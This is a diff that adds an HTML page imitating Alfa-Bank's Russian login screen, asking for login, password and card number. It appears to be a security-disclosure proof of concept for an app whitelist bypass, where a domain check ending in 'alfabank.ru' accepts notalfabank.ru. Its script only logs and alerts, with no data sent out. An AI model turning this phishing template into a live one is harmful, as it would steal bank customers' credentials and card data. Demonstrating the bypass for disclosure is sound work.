@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Альфа-Банк — Вход</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif; background: #fff; min-height: 100vh; padding: 24px; }
+  .logo { color: #EF3124; font-weight: 700; font-size: 24px; margin-bottom: 32px; }
+  h1 { font-size: 22px; margin-bottom: 8px; color: #1a1a1a; }
+  p.subtitle { color: #5e5e5e; margin-bottom: 28px; font-size: 14px; }
+  .field { margin-bottom: 16px; }
+  .field label { display: block; font-size: 13px; color: #5e5e5e; margin-bottom: 6px; }
+  .field input { width: 100%; height: 48px; border: 1px solid #d4d4d4; border-radius: 8px; padding: 0 16px; font-size: 16px; }
+  .field input:focus { outline: none; border-color: #EF3124; }
+  button { width: 100%; height: 52px; background: #EF3124; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 12px; }
+  .footnote { margin-top: 20px; font-size: 12px; color: #888; text-align: center; }
+  .warn { background: #FFF4E5; border: 1px solid #FFC78A; border-radius: 6px; padding: 12px; font-size: 13px; color: #5d4500; margin-bottom: 20px; }
+</style>
+</head>
+<body>
+  <div class="logo">α-Bank</div>
+  <h1>Подтверждение входа</h1>
+  <p class="subtitle">Для продолжения сессии введите данные карты</p>
+  
+  <div class="warn">⚠️ PoC: this page is hosted on attacker-controlled domain notalfabank.ru, which matches the alfa app whitelist `.endsWith("alfabank.ru")` bypass. No real data captured.</div>
+  
+  <form id="phishForm" autocomplete="off">
+    <div class="field">
+      <label>Логин Альфа-Клик</label>
+      <input type="text" placeholder="Введите логин" id="login">
+    </div>
+    <div class="field">
+      <label>Пароль</label>
+      <input type="password" placeholder="Введите пароль" id="password">
+    </div>
+    <div class="field">
+      <label>Номер карты</label>
+      <input type="text" placeholder="0000 0000 0000 0000" id="card" maxlength="19">
+    </div>
+    <button type="submit">Войти</button>
+  </form>
+  <div class="footnote">© Альфа-Банк, 2026</div>
+  
+<script>
+  // PoC marker: log to console + display window properties (no exfiltration)
+  console.log("[PoC] Loaded inside:", document.referrer || window.location.href);
+  console.log("[PoC] User-Agent:", navigator.userAgent);
+  document.getElementById("phishForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    alert("PoC: form would send to attacker. Demo only — no real exfil.");
+  });
+</script>
+</body>
+</html>
